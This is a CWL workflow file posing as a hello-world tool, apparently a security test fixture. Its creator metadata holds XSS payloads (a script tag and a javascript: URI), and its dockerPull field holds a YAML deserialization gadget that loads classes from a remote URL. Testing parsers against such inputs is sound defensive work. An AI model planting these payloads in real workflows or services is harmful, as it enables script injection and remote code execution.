#!/usr/bin/env cwl-runner

id: "hello-world"
label: "Simple hello world toola"
class: Workflow
cwlVersion: v1.0

$namespaces:
  dct: http://purl.org/dc/terms/
  foaf: http://xmlns.com/foaf/0.1/

dct:creator:
  "@id": "http://orcid.org/0000-0001-9758-0176"
  foaf:name: "<script>window.alert(3131)</script><h1>hi</h1>"
  foaf:mbox: "javascript:window.alert('hi')"

requirements:
- class: DockerRequirement
  dockerPull: !!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["https://localhost:3000"]
  ]]
]


inputs:
  template_file:
    type: File
    inputBinding:
      position: 1

  input_file:
    type: File
    inputBinding:
      position: 2


outputs:
  output:
    type: File
    outputBinding:
      glob: "helloworld.txt"

baseCommand: ["bash", "/usr/local/bin/hello_world"]
